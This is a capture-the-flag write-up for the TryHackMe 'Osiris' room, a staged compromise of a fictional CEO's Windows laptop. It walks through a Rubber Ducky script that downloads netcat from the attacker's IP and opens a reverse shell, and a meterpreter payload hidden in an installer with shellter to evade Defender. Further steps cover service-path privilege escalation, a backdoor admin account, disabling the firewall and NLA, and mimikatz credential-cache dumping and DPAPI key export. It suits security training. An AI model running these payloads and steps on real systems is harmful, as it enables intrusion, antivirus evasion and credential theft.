# [Osiris](https://tryhackme.com/room/osiris) - WriteUp

Difficulty: **INSANE**

```
Can you Quack it?
```

<!-- /Description -->

## Flags

<!-- TOC -->

- [Story](#Story)
- [Flags](#Flags)
  - [Flag 1](#Flag-1)
  - [Flag 2](#Flag-2)
    - [Bypass AV](#Bypass-AV)
  - [Flag 3](#Flag-3)
    - [Black Hat](#Black-Hat)

<!-- /TOC -->

---
## Story
```
As a final blow to Windcorp's security, you intend to hack the laptop of the CEO, Charlotte Johnson. You heard she has a boatload of Bitcoin, and those seem mighty tasty to you. But they have learned from the previous hacks and have introduced strict security measures.

However, you dropped a wifi RubberDucky on her driveway. Charlotte and her personal assistant Alcino, just drove up to her house and he picks up the bait as they enter the building. Sitting in your black van, just outside her house, you wait for them to plug in the RubberDucky (curiosity kills cats, remember?) and once you see the Ducky’s Wifi network pop up, you make a connection to the RubberDucky and are ready to send her a payload…

This is where your journey begins. Can you come up with a payload and get that sweet revshell? And if you do, can you bypass the tightened security? Remember, antivirus tools aren’t the sharpest tools in the shed, sometimes changing the code a little bit and recompiling the executable can bypass these simplest of detections.

As a final hint, remember that you have pwned their domain controller. You might need to revisit Ra or Ra2 to extract a key component to manage this task, you will need the keys to the kingdom... 


Info: To simulate the payload delivery, we have put up a TFTP-server on the target computer. Use that, to upload your RubberDucky-scripts.

Important: The TFTP server itself, any software or scripts you find regarding the RubberDucky is not a part of the challenge.

Also: remember you are deploying Ducky-script to a box with limited resources. Give it more time than you usually would, to finish the tasks.
```
---


## Flag 1

As the important information given next to the story there is a TFTP server running and we can run Rubber Ducky scripts on the target machine.

At this point, there is nothing much we can do. We can't scan or enumerate any port because all ports are blocked by a firewall to simulate we don't have local network access (Because, according to the story, we aren't on the same network as the CEO laptop. We were only dropping a USB rubber ducky with a reverse shell script on her driveway). So for now, our main foothold is the TFTP and Rubber Ducky scripts.

From the previous room in the Windcorp series, we know that Windows Defender and AppLocker is definitely on. If we intend to use netcat, we will need to put it in a path that Windows Defenders and AppLocker won't detect it.

We will place our netcat executable in `C:\windows\temp` because `C:\windows` is usually excluded from the rules.

This is the Rubber Ducky script we will use to download the netcat executable from our machine.

```
REM The next three lines execute a command prompt in Windows
DELAY 500
GUI r
DELAY 500
STRING powershell -W hidden
ENTER
DELAY 1000
ENTER
STRING Invoke-WebRequest http://10.4.33.237:8000/nc.exe -outfile c:\windows\temp\nc64.exe
ENTER
DELAY 1000
STRING c:\windows\temp\nc64.exe 10.4.33.237 9999 -e cmd
ENTER
```

We need to host the netcat executable with a python SimpleHTTPServer using command below:
```
python3 -m http.server
```

And we will need to setup a netcat listener on our machine to cache the rev shell.
```
sudo rlwrap -cAr nc -lvnp 9999
```

Once the netcat executable is downloaded, the Rubber Ducky script will run the next command and spawn a netcat reverse shell.

When we have our rev shell, we can do some directory enumeration

```
 Directory of C:\Users\alcrez\Desktop

09/19/2020  01:34 AM    <DIR>          .
09/19/2020  01:34 AM    <DIR>          ..
09/19/2020  01:34 AM                45 Flag1.txt
09/16/2020  12:18 PM             1,034 Update VPN.lnk
               2 File(s)          1,079 bytes
               2 Dir(s)  36,812,042,240 bytes free
```
On our user `alcrez` desktop we find our first flag `Flag 1` **/** `C:\Users\alcres\Desktop\Flag1.txt`

## Flag 2
Also there is a shortcut named `Update VPN` points to: `C:\script\update.vbs`

In the `C:\script\` directory we find two scripts `update.vbs` and `copyprofile.cmd`

```
C:\script>dir
dir
09/16/2020  12:18 PM    <DIR>          .
09/16/2020  12:18 PM    <DIR>          ..
09/16/2020  12:17 PM               279 copyprofile.cmd
09/16/2020  11:47 AM                81 update.vbs
               2 File(s)            360 bytes
               2 Dir(s)  36,803,567,616 bytes free
```

By using the `cacls` command in `C:\scripts`, we can see the user `scheduler` has full access to both of the files, but we have only read access
```
C:\script>cacls *
cacls *
C:\script\copyprofile.cmd BUILTIN\Administrators:(ID)F
                          NT AUTHORITY\SYSTEM:(ID)F
                          BUILTIN\Users:(ID)R
                          OSIRIS\scheduler:(ID)F

C:\script\update.vbs BUILTIN\Administrators:(ID)F
                     NT AUTHORITY\SYSTEM:(ID)F
                     BUILTIN\Users:(ID)R
                     OSIRIS\scheduler:(ID)F
```

The only thing `update.vbs` do is write an event with ID 4 to the event log on the system.
```
PS C:\script> cat update.vbs
cat update.vbs
Set shell = CreateObject("WScript.Shell")
shell.LogEvent 4, "Update VPN profile"
```

But `copyprofile.cmd` does some more interesting stuff

It started by downloading and extracting a VPN profile from `vpn.windcorp.thm` to `C:\temp\`
And it copy everything from `C:\temp` to `C:\program files\IVPN Client\`
```
PS C:\script> cat copyprofile.cmd
cat copyprofile.cmd
powershell -c "Invoke-WebRequest https://vpn.windcorp.thm/profile.zip -outfile c:\temp\profile.zip"
powershell Expand-Archive c:\temp\profile.zip -DestinationPath c:\temp\
powershell -c "copy-Item -Path 'C:\Temp\*' -Destination 'C:\Program Files\IVPN Client' -Recurse -force"
```

After 1 command of enumeration, we found something like a VPN profile in `C:\temp\`, but there is nothing we can use in there
```
C:\script>dir /s c:\temp\
dir /s c:\temp\
 Volume in drive C has no label.
 Volume Serial Number is DEA7-4E33

 Directory of c:\temp

11/22/2020  12:59 PM    <DIR>          .
11/22/2020  12:59 PM    <DIR>          ..
09/16/2020  11:55 AM    <DIR>          OpenVPN
               0 File(s)              0 bytes

 Directory of c:\temp\OpenVPN

09/16/2020  11:55 AM    <DIR>          .
09/16/2020  11:55 AM    <DIR>          ..
09/16/2020  12:16 PM    <DIR>          x86_64
               0 File(s)              0 bytes

 Directory of c:\temp\OpenVPN\x86_64

09/16/2020  12:16 PM    <DIR>          .
09/16/2020  12:16 PM    <DIR>          ..
09/16/2020  12:16 PM             1,554 ca.crt
09/16/2020  12:16 PM             5,099 client1.crt
09/16/2020  12:16 PM             1,675 client1.key
09/16/2020  12:16 PM               247 IVPN-Singlehop-Canada-Toronto-TCP-mode.conf
09/16/2020  12:16 PM               241 IVPN-Singlehop-Canada-Toronto.conf
09/16/2020  12:16 PM               247 IVPN-Singlehop-France-TCP-mode.conf
09/16/2020  12:16 PM               241 IVPN-Singlehop-France.conf
09/16/2020  12:16 PM               247 IVPN-Singlehop-Germany-TCP-mode.conf
09/16/2020  12:16 PM               241 IVPN-Singlehop-Germany.conf
09/16/2020  12:16 PM               247 IVPN-Singlehop-Hongkong-TCP-mode.conf
09/16/2020  12:16 PM               241 IVPN-Singlehop-Hongkong.conf
09/16/2020  12:16 PM               247 IVPN-Singlehop-Iceland-TCP-mode.conf
09/16/2020  12:16 PM               241 IVPN-Singlehop-Iceland.conf
09/16/2020  12:16 PM               247 IVPN-Singlehop-Netherlands-TCP-mode.conf
09/16/2020  12:16 PM               241 IVPN-Singlehop-Netherlands.conf
09/16/2020  12:16 PM               247 IVPN-Singlehop-Romania-TCP-mode.conf
09/16/2020  12:16 PM               241 IVPN-Singlehop-Romania.conf
09/16/2020  12:16 PM               247 IVPN-Singlehop-Switzerland-TCP-mode.conf
09/16/2020  12:16 PM               241 IVPN-Singlehop-Switzerland.conf
09/16/2020  12:16 PM               247 IVPN-Singlehop-UK-London-TCP-mode.conf
09/16/2020  12:16 PM               241 IVPN-Singlehop-UK-London.conf
09/16/2020  12:16 PM               247 IVPN-Singlehop-USA-Dallas-TX-TCP-mode.conf
09/16/2020  12:16 PM               241 IVPN-Singlehop-USA-Dallas-TX.conf
09/16/2020  12:16 PM               247 IVPN-Singlehop-USA-Los-Angeles-CA-TCP-mode.conf
09/16/2020  12:16 PM               241 IVPN-Singlehop-USA-Los-Angeles-CA.conf
09/16/2020  12:16 PM               247 IVPN-Singlehop-USA-New-Jersey-TCP-mode.conf
09/16/2020  12:16 PM               241 IVPN-Singlehop-USA-New-Jersey.conf
09/16/2020  12:16 PM               247 IVPN-Singlehop-USA-SaltLakeCity-UT-TCP-mode.conf
09/16/2020  12:16 PM               241 IVPN-Singlehop-USA-SaltLakeCity-UT.conf
09/16/2020  12:16 PM               636 ta.key
              30 File(s)         15,308 bytes

     Total Files Listed:
              30 File(s)         15,308 bytes
               8 Dir(s)  36,789,202,944 bytes free
```

Now we know there is an `IVPN Client` running, we can use powershell to check the `IVPN Client` detail info
```
PS C:\Temp> Get-WMIObject -Class Win32_Service -Filter "Name='ivpn client'" | select-object *
Get-WMIObject -Class Win32_Service -Filter "Name='ivpn client'" | select-object *


PSComputerName          : OSIRIS
Name                    : IVPN Client
Status                  : OK
ExitCode                : 0
DesktopInteract         : False
ErrorControl            : Normal
PathName                : C:\Program Files\IVPN
                          Client\IVPN Service.exe
ServiceType             : Own Process
StartMode               : Auto
__GENUS                 : 2
__CLASS                 : Win32_Service
__SUPERCLASS            : Win32_BaseService
__DYNASTY               : CIM_ManagedSystemElemen
                          t
__RELPATH               : Win32_Service.Name="IVP
                          N Client"
__PROPERTY_COUNT        : 26
__DERIVATION            : {Win32_BaseService,
                          CIM_Service,
                          CIM_LogicalElement, CIM
                          _ManagedSystemElement}
__SERVER                : OSIRIS
__NAMESPACE             : root\cimv2
__PATH                  : \\OSIRIS\root\cimv2:Win
                          32_Service.Name="IVPN
                          Client"
AcceptPause             : False
AcceptStop              : True
Caption                 : IVPN Client
CheckPoint              : 0
CreationClassName       : Win32_Service
DelayedAutoStart        : False
Description             :
DisplayName             : IVPN Client
InstallDate             :
ProcessId               : 2612
ServiceSpecificExitCode : 0
Started                 : True
StartName               : LocalSystem
State                   : Running
SystemCreationClassName : Win32_ComputerSystem
SystemName              : OSIRIS
TagId                   : 0
WaitHint                : 0
Scope                   : System.Management.Manag
                          ementScope
Path                    : \\OSIRIS\root\cimv2:Win
                          32_Service.Name="IVPN
                          Client"
Options                 : System.Management.Objec
                          tGetOptions
ClassPath               : \\OSIRIS\root\cimv2:Win
                          32_Service
Properties              : {AcceptPause,
                          AcceptStop, Caption,
                          CheckPoint...}
SystemProperties        : {__GENUS, __CLASS,
                          __SUPERCLASS,
                          __DYNASTY...}
Qualifiers              : {dynamic, Locale,
                          provider, UUID}
Site                    :
Container               :
```

When we were checking for [unquoted service paths](https://www.ired.team/offensive-security/privilege-escalation/unquoted-service-paths), we actually found two vulnerable services command:
```
cmd /c wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```
2 services returned:
```
C:\Temp>cmd /c wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
cmd /c wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """

IVPN Client                                                                         IVPN Client                               C:\Program Files\IVPN Client\IVPN Service.exe                                       Auto
nordvpn-service                                                                     nordvpn-service                           C:\Program Files\NordVPN\nordvpn-service.exe                                        Auto
```
Checking permission for both services directory shows us we don't have any write permission on the NordVPN service directory.

```
C:\Users\alcrez>cacls "C:\program files\NordVPN"
cacls "C:\program files\NordVPN"
C:\program files\NordVPN NT SERVICE\TrustedInstaller:(ID)F 
                         NT SERVICE\TrustedInstaller:(CI)(IO)(ID)F 
                         NT AUTHORITY\SYSTEM:(ID)F 
                         NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(ID)F 
                         BUILTIN\Administrators:(ID)F 
                         BUILTIN\Administrators:(OI)(CI)(IO)(ID)F 
                         BUILTIN\Users:(ID)R 
                         BUILTIN\Users:(OI)(CI)(IO)(ID)(special access:)
                                                       GENERIC_READ
                                                       GENERIC_EXECUTE
 
                         CREATOR OWNER:(OI)(CI)(IO)(ID)F 
                         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(ID)R 
                         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(ID)(special access:)
                                                                                                GENERIC_READ
                                                                                                GENERIC_EXECUTE
 
                         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(ID)R 
                         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(IO)(ID)(special access:)
                                                                                                           GENERIC_READ
                                                                                                           GENERIC_EXECUTE
```
But when we check the IVPN service directory, we still don't have any write permission, but the user `scheduler` has write permission.

```
C:\Users\alcrez>cacls "C:\program files\IVPN Client"
cacls "C:\program files\IVPN Client"
C:\program files\IVPN Client OSIRIS\scheduler:(OI)(CI)(special access:)
                                                      READ_CONTROL
                                                      SYNCHRONIZE
                                                      FILE_GENERIC_READ
                                                      FILE_GENERIC_WRITE
                                                      FILE_GENERIC_EXECUTE
                                                      FILE_READ_DATA
                                                      FILE_WRITE_DATA
                                                      FILE_APPEND_DATA
                                                      FILE_READ_EA
                                                      FILE_WRITE_EA
                                                      FILE_EXECUTE
                                                      FILE_READ_ATTRIBUTES
                                                      FILE_WRITE_ATTRIBUTES
 
                             NT SERVICE\TrustedInstaller:(ID)F 
                             NT SERVICE\TrustedInstaller:(CI)(IO)(ID)F 
                             NT AUTHORITY\SYSTEM:(ID)F 
                             NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(ID)F 
                             BUILTIN\Administrators:(ID)F 
                             BUILTIN\Administrators:(OI)(CI)(IO)(ID)F 
                             BUILTIN\Users:(ID)R 
                             BUILTIN\Users:(OI)(CI)(IO)(ID)(special access:)
                                                           GENERIC_READ
                                                           GENERIC_EXECUTE
 
                             CREATOR OWNER:(OI)(CI)(IO)(ID)F 
                             APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(ID)R 
                             APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(ID)(special access:)
                                                                                                    GENERIC_READ
                                                                                                    GENERIC_EXECUTE
 
                             APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(ID)R 
                             APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(IO)(ID)(special access:)
                                                                                                               GENERIC_READ
                                                                                                               GENERIC_EXECUTE

```

With all of that info, we know that the IVPN service is vulnerable to unquoted paths, and if run the `update.vbs` script will trigger the `copyprofile.cmd` script to download and extract a VPN profile to `C:\temp` and copy everything from `C:\temp` to `C:\Program Files\ivpn client\`

If we have written permission in the `C:\temp` (which we have), we can upload any file to `C:\Program Files\ivpn client\`, but remember only admin privileges user and `scheduler` have written permission in `C:\Program Files\ivpn client\` so most likely the `copyprofile.cmd` script is running with `scheduler` privilege

A quick test can confirm we can upload file to `C:\Program Files\ivpn client\`
```
C:\Temp>echo sussy-baka > sus.txt
echo sussy-baka > sus.txt

C:\Temp>cscript C:\script\update.vbs
cscript C:\script\update.vbs
Microsoft (R) Windows Script Host Version 5.812
Copyright (C) Microsoft Corporation. All rights reserved.


C:\Temp>more "C:\Program Files\ivpn client\sus.txt"
more "C:\Program Files\ivpn client\sus.txt"
sussy-baka
```
A quick defender check shows us that it's not the latest version but it's not that old either
```
AMEngineVersion                 : 1.1.17500.4
AMProductVersion                : 4.18.2009.7
AMRunningMode                   : Normal
AMServiceEnabled                : True
AMServiceVersion                : 4.18.2009.7
AntispywareEnabled              : True
AntispywareSignatureAge         : 606
AntispywareSignatureLastUpdated : 10/17/2020 
                                  12:17:31 AM
AntispywareSignatureVersion     : 1.325.924.0
AntivirusEnabled                : True
AntivirusSignatureAge           : 606
AntivirusSignatureLastUpdated   : 10/17/2020 
                                  12:17:33 AM
AntivirusSignatureVersion       : 1.325.924.0
BehaviorMonitorEnabled          : True
ComputerID                      : 1B8B290B-380B-4
                                  932-B705-1BA4A5
                                  0EEAC5
ComputerState                   : 0
FullScanAge                     : 4294967295
FullScanEndTime                 : 
FullScanStartTime               : 
IoavProtectionEnabled           : True
IsTamperProtected               : True
IsVirtualMachine                : True
LastFullScanSource              : 0
LastQuickScanSource             : 2
NISEnabled                      : True
NISEngineVersion                : 1.1.17500.4
NISSignatureAge                 : 606
NISSignatureLastUpdated         : 10/17/2020 
                                  12:17:33 AM
NISSignatureVersion             : 1.325.924.0
OnAccessProtectionEnabled       : True
QuickScanAge                    : 0
QuickScanEndTime                : 6/15/2022 
                                  8:10:41 PM
QuickScanStartTime              : 6/15/2022 
                                  8:09:46 PM
RealTimeProtectionEnabled       : True
RealTimeScanDirection           : 0
PSComputerName                  :
```
so now we just need to make a reverse shell payload that can bypass defender, name it `IVPN Service.exe`, put it in `C:\temp` and run the `update.vbs` script to upload and overwrite the original `IVPN Service.exe` and when restart the service will run it with `NT AUTHORITY\SYSTEM`

When we check defender settings we can see all of the [ASR](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide) rules are active
```
PS C:\Temp> Get-MPPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids
Get-MPPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids
01443614-cd74-433a-b99e-2ecdc07bfc25
26190899-1602-49e8-8b27-eb1d0a1ce869
3B576869-A4EC-4529-8536-B80A7769E899
5BEB7EFE-FD9A-4556-801D-275E5FFC04CC
75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84
7674ba52-37eb-4a4f-a9a1-f0f9a1619a2c
92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B
9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2
b2b3f03d-6a65-4f7b-a9c7-1c7ef74a9ba4
BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550
c1db55ab-c21a-4637-bb3f-a12568109d35
d1e49aac-8f56-4280-b9ba-993a6d77406c
D3E037E1-3EB8-44C8-A917-57927947596D
D4F940AB-401B-4EFC-AADC-AD5F3C50688A
e6db77e5-3df2-4cf1-b95a-636979351e5b
```
Also Tamper Protection is on
```
C:\Windows\system32>reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features
    TamperProtection    REG_DWORD    0x1
```
---
So, for now, our gold is to create an undetectable reverse shell payload and disable Tamper Protection, then defender and the firewall.

First, for the payload part, the original room creator walkthrough recommended an old tool on [github](https://github.com/mattymcfatty/unquotedPoC), but in this case, we will use [shellter](https://www.shellterproject.com)

And for the disabled AV part, the original room creator walkthrough recommended a powershell script on [github](https://gist.github.com/tyranid/c65520160b61ec851e68811de3cd646d), but it has to be split into two parts. The first part is to set up a schedule task to disable the AV, and the last part requires NT AUTHORITY\SYSTEM, but we are going to use a GUI tool called [Defender Control.](https://www.sordum.org/9480/defender-control-v2-1/)

---
## **Bypass AV**

First we need to create a raw meterpreter reverse shell payload
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=69 -e x86/shikata_ga_nai -i 32 -f raw -o payload32.raw
```
After that, we need to download a tool called TubeDigger, and this is going to be the file that we will inject shellcode into it
```
wget https://www.tubedigger.com/TubeDigger_Install.exe
```
And finally we run shellter
```
.\shellter.exe -a -s -f TubeDigger_Install.exe -p payload32.raw
```
Use wine if on line
```
wine shellter.exe -a -s -f TubeDigger_Install.exe -p payload32.raw
```
While waiting for shellter we can set up metasploit multi handler
And remember to set the auto run script to auto migrate because the file we replace isn't a VPN client, so it is going to crash after running
```
set AutoRunScript post/windows/manage/migrate
```
After shellter is done and metasploit multi handler is running, we can do the same with netcat. We are going to host this with python SimpleHTTPServer
On the target machine, we can use wget in powershell to download and output it in C:\temp
```
powershell wget '10.10.143.251:8000/TubeDigger_Install.exe' -o 'IVPN Service.exe'
```
Before we can run the update.vbs script, we need to stop the IVPN Client service
```
C:\Temp>powershell -c "Get-Service -Name 'IVPN*' "
C:\Temp>powershell -c "Stop-Service -Name 'IVPN*' "
```
Run the script
```
cscript C:\script\update.vbs
```
wait for a bit and check if the file is replaced
```
C:\Temp>dir "C:\Program Files\ivpn client\" | find "IVPN Service.exe"
```
If the file is replaced, we can restart the service to execute the payload
```
C:\Temp>powershell -c "Restart-Service -Name 'IVPN*' "
```
If the service crash too fast and metasploit didn't finish migrate, run the command again or try with start instead of restart
And now we have NT AUTHORITY\SYSTEM
```
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.127.125:69 
[*] Sending stage (176195 bytes) to 10.10.239.183
[*] Meterpreter session 2 opened (10.10.127.125:69 -> 10.10.239.183:51056) at 2022-06-16 10:27:29 +0100
[*] Session ID 2 (10.10.127.125:69 -> 10.10.239.183:51056) processing AutoRunScript 'post/windows/manage/migrate'
[*] Running module against OSIRIS
[*] Current server process: IVPN Service.exe (748)
[*] Spawning notepad.exe process to migrate into
[*] Spoofing PPID 0
[*] Migrating into 2792
[*] Sending stage (176195 bytes) to 10.10.239.183
[*] Meterpreter session 3 opened (10.10.127.125:69 -> 10.10.239.183:51059) at 2022-06-16 10:27:32 +0100
[*] Session ID 3 (10.10.127.125:69 -> 10.10.239.183:51059) processing AutoRunScript 'post/windows/manage/migrate'
[*] Running module against OSIRIS
[*] Current server process: IVPN Service.exe (5568)
[*] Spawning notepad.exe process to migrate into
[*] Spoofing PPID 0
[*] Migrating into 6976
[+] Successfully migrated into process 2792

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```
After enumerate all of the user we found our second flag on user `chajoh` desktop `Flag 2` **/** `C:\Users\chajoh\Desktop\Flag2.txt`

## Flag 3
First, we need to create a new user and log in via remote desktop with that new user
So we are going to create a user named `tom` and add him to local administrator group
```
net user tom Pssw0rd123 /add

net localgroup administrators tom /add
```
Now are will disable the Firewall and Add Everyone into Remote Desktop Users group
```
net localgroup "Remote Desktop Users" Everyone /Add

netsh advfirewall set allprofiles state off
```
After that, we need to activate the RDS (Remote Desktop Service) and disable NLA (Network Level Authentication)
```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP" /v UserAuthentication /t REG_DWORD /d "0" /f
```
After login with the user `tom` via RDP and we need to disable the AV with the [Defender Control](https://gist.github.com/tyranid/c65520160b61ec851e68811de3cd646d) tool

## Black Hat

And now, for the third flag, we need to download two of the tool in the CQTools show in Black hat Asia 2019 (`CQDPAPIBlobSearcher.exe` and `CQMasterKeyAD.exe`)

Also `mimikatz.exe`

For the first tool `CQDPAPIBlobSearcher.exe` it was easy to find it either on [github](https://github.com/BlackDiverX/cqtools) or some [blog](https://www.kitploit.com/2019/05/cqtools-new-ultimate-windows-hacking.html)

But for the second tool `CQMasterKeyAD.exe` I can't find it anywhere, and only a few people on tryhackme discord have it. After I got the tool, I [archive](https://archive.org/details/cqmaster-key-ad_69) it (I didn't just archive it for this writeup)

---
Back to enumeration, we found a KeePass database in `chajoh` Documents `Database.kdbx`

we can view the config file in `C:\Users\chajoh\AppData\Roaming\KeePass\KeePass.config.xml` and it is using the user `chajoh` as a MasterKey (DPAPI) 
```
    <KeySources>
      <Association>
        <DatabasePath>..\..\Users\chajoh\Documents\Database.kdbx</DatabasePath>
        <UserAccount>true</UserAccount>
      </Association>
      <Association>
        <DatabasePath>..\..\Users\chajoh\Documents\Database2.kdbx</DatabasePath>
        <UserAccount>true</UserAccount>
      </Association>
    </KeySources>
```
So to open it, we need to log in as user `chajoh` by extracting her cached hash and run a dictionary attack or overwrite her hash. Both can be done with `mimikatz`
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

800     {0;000003e7} 1 D 32579          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;002d73c8} 2 F 12325976    OSIRIS\tom   S-1-5-21-2412384816-2079449310-1594074140-1004  (15g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 12408954    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz # lsadump::cache
Domain : OSIRIS
SysKey : fb2f42c056c3a91c3f8892df313f2481

Local name : OSIRIS ( S-1-5-21-2412384816-2079449310-1594074140 )
Domain name : WINDCORP ( S-1-5-21-555431066-3599073733-176599750 )
Domain FQDN : windcorp.thm

Policy subsystem is : 1.18
LSA Key(s) : 1, default {04097fcd-7247-4e79-b35b-2a7d5fee2779}
  [00] {04097fcd-7247-4e79-b35b-2a7d5fee2779} 0d155c51e747c1119d69e11e96f37364aaaa190673e7ccb1321a931636b166c2

* Iteration is set to default (10240)

[NL$1 - 9/19/2020 1:38:15 AM]
RID       : 00000465 (1125)
User      : WINDCORP\chajoh
MsCacheV2 : f52542bb7f50df1b7bb0fd0ef1778781

[NL$2 - 9/12/2020 4:14:18 AM]
RID       : 0000168a (5770)
User      : WINDCORP\shelweb
MsCacheV2 : c5e541582794b0a92f813ec250f3a3a6

[NL$3 - 10/3/2020 1:19:49 AM]
RID       : 00000573 (1395)
User      : WINDCORP\alcrez
MsCacheV2 : d314d29973862ad7d8166ba7999cbf2d
```
After extracting her hash, I run a dictionary attack with rockyou and hashkiller-dict-2020-01-26 wordlist. (hashkiller-dict has 266,518,036 passwords) but I still can't crack the hash, so overwrite it is

```
mimikatz # lsadump::cache /user:chajoh /password:Password123# /kiwi
> User cache replace mode !
  * user     : chajoh
  * password : Password123#
  * ntlm     : 7a1762d79c21e263eae080fadbb03429

Domain : OSIRIS
SysKey : fb2f42c056c3a91c3f8892df313f2481

Local name : OSIRIS ( S-1-5-21-2412384816-2079449310-1594074140 )
Domain name : WINDCORP ( S-1-5-21-555431066-3599073733-176599750 )
Domain FQDN : windcorp.thm

Policy subsystem is : 1.18
LSA Key(s) : 1, default {04097fcd-7247-4e79-b35b-2a7d5fee2779}
  [00] {04097fcd-7247-4e79-b35b-2a7d5fee2779} 0d155c51e747c1119d69e11e96f37364aaaa190673e7ccb1321a931636b166c2

* Iteration is set to default (10240)

[NL$1 - 9/19/2020 1:38:15 AM]
RID       : 00000465 (1125)
User      : WINDCORP\chajoh
MsCacheV2 : ef776e82446836a67b699ba8b010aba6
> User cache replace mode (2)!
  MsCacheV2 : 2cae01963f60b1f0f014b491e5f945c5
  Checksum  : 888dcf10676db1b67aade658e65e6458
> OK!

[NL$2 - 9/12/2020 4:14:18 AM]
RID       : 0000168a (5770)
User      : WINDCORP\shelweb
MsCacheV2 : c5e541582794b0a92f813ec250f3a3a6

[NL$3 - 10/3/2020 1:19:49 AM]
RID       : 00000573 (1395)
User      : WINDCORP\alcrez
MsCacheV2 : d314d29973862ad7d8166ba7999cbf2d
```
After overwrite the hash we need to note the password NTLM hash `d314d29973862ad7d8166ba7999cbf2d`

But if we do this, we can no longer access the KeePass database even if we are login as chajoh because the KeePass database is protected by DPAPI (Data Protection API)

The MasterKey in DPAPI were encrypted using the user password, so when we overwrite the password, the MasterKey can no longer unlock

So now we need to recreate the user MasterKey with the Backup DPAPI Key from their domain controller: [Ra](https://tryhackme.com/room/ra)

Basically, we need to regain access to `Ra` and export the backup DPAPI Key

```
mimikatz # lsadump::backupkeys /system:localhost /export

Current prefered key:       {07ea03b4-3b28-4270-8862-0bc66dacef1a}
  * RSA key
        |Provider name : Microsoft Strong Cryptographic Provider
        |Unique name   :
        |Implementation: CRYPT_IMPL_SOFTWARE ;
        Algorithm      : CALG_RSA_KEYX
        Key size       : 2048 (0x00000800)
        Key permissions: 0000003f ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_EXPORT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
        Exportable key : YES
        Private export : OK - 'ntds_capi_0_07ea03b4-3b28-4270-8862-0bc66dacef1a.keyx.rsa.pvk'
        PFX container  : OK - 'ntds_capi_0_07ea03b4-3b28-4270-8862-0bc66dacef1a.pfx'
        Export         : OK - 'ntds_capi_0_07ea03b4-3b28-4270-8862-0bc66dacef1a.der'

Compatibility prefered key: {887f3d05-3f50-4a1d-88c0-9a4b27e913c8}
  * Legacy key
92ce4fd5a55d6d7742135d325b09fd68aa0ad796fcc6eb2636663cec51a6b8fe
2a8933f4a98f7f97c303495d6579f83bd3678c65f9ffa28eca94e1d7f674bd33
90247312bf23dc6cd1ca1e1202748742dd0e80a48fb5579f5eeb4f461197f770
2033abcde34ca01f22cc5326089c1b14fbe95ef4431eabb475f7d910a53a18f9
11f0773bd40cf5382fdb0ea5c9e6fb12ad109fbd2195b71123ffc6bebd98ccfb
6034895425694257da9679081b9bc74aa0eeeaf68ace38df4bd26cf4d4100b6c
cf23bf6aef814bfcb824674b92fab623736d4f3187cbad2d0be6c893f191c8ea
eeec95d2cbe0a3149813bd02532a9f0f1f951755a7137060ffad541446333057

        Export         : OK - 'ntds_legacy_0_887f3d05-3f50-4a1d-88c0-9a4b27e913c8.key'
```

Now we are going to use two of the tool in the CQTools `CQDPAPIBlobSearcher.exe` and `CQMasterKeyAD.exe` to recreate the user DPAPI key

First we will use `CQDPAPIBlobSearcher.exe` to find the KeePass MasterKey.

```
C:\Users\chajoh\Desktop>CQDPAPIBlobSearcher.exe /d c:\users\chajoh\appdata\roaming /r /o c:\users\chajoh\Desktop
Scanning c:\users\chajoh\appdata\roaming\KeePass\KeePass.config.xml
Scanning c:\users\chajoh\appdata\roaming\KeePass\ProtectedUserKey.bin
Found 1 in c:\users\chajoh\appdata\roaming\keepass\protecteduserkey.bin
 mkguid:               a773eede-71b6-4d66-b4b8-437e01749caa
 flags:                0x0
 hashAlgo:             0x8004 (SHA1)
 cipherAlgo:           0x6603 (3DES)
 cipherText:
98 9A 82 53 43 24 EC E4 F7 F5 3A 0A 19 53 C6 89   ...SC$....:..S..
49 86 2B 18 F2 A2 01 C9 50 0E 0B 2B DC A4 1E 46   I.+.....P..+...F
